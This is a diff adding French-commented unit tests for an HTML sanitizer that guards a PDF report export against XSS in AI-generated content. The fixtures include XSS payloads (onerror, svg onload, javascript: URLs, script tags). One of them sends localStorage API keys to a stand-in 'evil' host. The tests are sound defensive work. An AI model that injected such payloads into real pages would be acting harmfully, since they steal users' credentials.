@@ -2,7 +2,9 @@ import { describe, it, expect } from 'vitest'
 import {
   buildConversationMarkdown,
   buildConversationHtml,
+  sanitizeReportHtml,
 } from '../../services/conversationExport'
+import { saveReport, getReport } from '../../services/reportGenerator'
 import type { Conversation } from '../../types'
 
 const fakeConv: Conversation = {
@@ -136,5 +138,65 @@ describe('buildConversationHtml', () => {
     const conv = { ...fakeConv, title: '<b>boom</b>' }
     const html = buildConversationHtml(conv)
     expect(html).toContain('&lt;b&gt;boom&lt;/b&gt;')
+  })
+})
+
+// ============================================================================
+// sanitizeReportHtml — garde XSS du chemin export PDF (le HTML d'un rapport
+// peut être généré par l'IA = empoisonnable par prompt-injection ; il est
+// réinjecté dans la page PRINCIPALE via innerHTML pour la rasterisation).
+// ============================================================================
+describe('sanitizeReportHtml — sécurité (neutralise le HTML hostile)', () => {
+  it("retire <script> et les attributs déclencheurs (on*)", async () => {
+    const dirty = '<div><img src=x onerror="alert(1)"><script>alert(2)</script></div>'
+    const clean = await sanitizeReportHtml(dirty)
+    expect(clean).not.toContain('onerror')
+    expect(clean.toLowerCase()).not.toContain('<script')
+    expect(clean).not.toContain('alert(2)')
+  })
+
+  it('retire <svg onload>', async () => {
+    const clean = await sanitizeReportHtml('<svg onload="alert(1)"></svg>')
+    expect(clean).not.toContain('onload')
+  })
+
+  it("retire les URL javascript: et les <iframe>", async () => {
+    const clean = await sanitizeReportHtml('<a href="javascript:alert(1)">x</a><iframe src="x"></iframe>')
+    expect(clean).not.toContain('javascript:')
+    expect(clean.toLowerCase()).not.toContain('<iframe')
+  })
+
+  it("retire le onclick des boutons du gabarit de rapport", async () => {
+    const dirty = `<button onclick="window.parent.postMessage({type:'arty-report-export-pdf'},'*')">PDF</button>`
+    const clean = await sanitizeReportHtml(dirty)
+    expect(clean).not.toContain('onclick')
+  })
+
+  it("neutralise un onerror injecté par l'IA dans le contenu du rapport, tout en gardant le rapport", async () => {
+    const id = saveReport('Rapport', `<p>contenu sûr</p><img src=x onerror="fetch('//evil/?d='+localStorage.getItem('api-keys'))">`)
+    const clean = await sanitizeReportHtml(getReport(id)!)
+    expect(clean).not.toContain('onerror')
+    expect(clean).toContain('contenu sûr')
+    expect(clean).toContain('<style') // le style du rapport survit
+  })
+})
+
+describe('sanitizeReportHtml — fidélité visuelle (le rapport reste stylé)', () => {
+  it("préserve le <style> du <head> et son CSS (WHOLE_DOCUMENT actif)", async () => {
+    const id = saveReport('Rapport Test', '<h1>Bonjour</h1><p>Contenu</p>')
+    const clean = await sanitizeReportHtml(getReport(id)!)
+    expect(clean).toContain('<style')
+    // Garde-fou : si quelqu'un retire WHOLE_DOCUMENT, le <head><style> saute et
+    // ces marqueurs disparaissent → le rapport sortirait sans aucun style.
+    expect(clean).toContain('counter-increment:sec')
+    expect(clean).toContain('body::before')
+    expect(clean).toContain('Bonjour')
+    expect(clean).toContain('Contenu')
+  })
+
+  it("préserve les styles inline (le chemin export conversation reste intact)", async () => {
+    const clean = await sanitizeReportHtml(buildConversationHtml(fakeConv))
+    expect(clean).toContain('style=')
+    expect(clean).toContain('<strong>Salut !</strong>')
   })
 })
